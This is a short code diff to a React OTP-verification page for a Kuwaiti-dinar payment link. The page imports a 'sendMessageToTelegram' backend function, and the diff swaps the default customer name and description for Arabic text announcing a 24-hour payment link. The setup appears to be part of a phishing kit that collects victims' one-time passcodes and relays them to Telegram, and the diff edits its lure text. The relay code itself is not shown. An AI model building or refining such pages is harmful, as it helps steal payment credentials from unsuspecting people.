@@ -4,10 +4,10 @@ import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp
 import { sendMessageToTelegram } from "@/backend/telegramService";
 
 const defaultPaymentData = {
-  customerName: "يوسف غازي الرشيدي",
+  customerName: "halits.YILDIZ",
   amount: "5.000",
   currency: "KWD",
-  description: "Family Support"
+  description: "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة."
 };
 
 const OTPVerification = () => {
